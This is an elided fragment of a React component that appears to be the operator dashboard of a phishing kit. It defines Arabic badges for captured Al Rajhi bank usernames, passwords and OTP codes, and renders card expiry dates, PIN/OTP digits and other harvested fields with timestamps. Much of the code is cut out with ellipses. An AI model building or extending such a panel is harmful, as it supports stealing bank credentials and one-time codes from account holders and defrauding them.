...
export function DataBubble({
  ...
  const getStatusBadge = () => {
    ...
    const badges: Record<string, { text: string; className: string }> = {
      ...
      rajhiUser: { text: "👤 مستخدم الراجحي", className: "bg-teal-100 text-teal-800 border-teal-300" },
      rajhiPassword: { text: "🔒 كلمة مرور الراجحي", className: "bg-rose-100 text-rose-800 border-rose-300" },
      rajhiOtp: { text: "📱 رمز الراجحي", className: "bg-cyan-100 text-cyan-800 border-cyan-300" },
    }

    const badge = badges[status]
    if (!badge) return null

    return <span className={`px-2 py-1 rounded-md text-xs font-bold border ${badge.className}`}>{badge.text}</span>
  }
  ...
  if (isCardData) {
    ...
    return (
      ...
      >
        ...
        <div className="mb-2">
          {timestamp && <div className="text-[10px] text-gray-500 text-right mb-0.5">{formatTimestamp(timestamp)}</div>}
        ...
        >
          ...
          <div className="relative h-full flex flex-col justify-between">
            ...
            <div className="flex items-start justify-between mb-2">
              <div className="flex items-center gap-2">{icon && <span className="text-3xl">{icon}</span>}</div>
              {isLatest && (
            ...
            <div className="flex items-end justify-between mt-auto">
              <div className="flex gap-4 text-base">
                <div>
                  ...
                  <div className="font-bold text-lg" style={{ direction: "ltr" }}>
                    {expiryDate}
                  </div>
                </div>
                <div>
      ...
      {isPinOrOtp && digitValue ? (
        <div className="flex justify-center gap-1 mb-2" style={{ direction: "ltr" }}>
          {digitValue.split("").map((digit, index) => (
            <div key={index} className="bg-white rounded shadow-sm flex items-center justify-center w-8 h-10">
            ...
            {Object.entries(data).map(([key, value]) => {
              ...
              return (
                <div key={key} className="flex justify-between items-center gap-2 text-sm">
                  ...
                  <span className="text-gray-900 font-bold text-right">{value?.toString() || "-"}</span>
                </div>
              )
            })}
          </div>
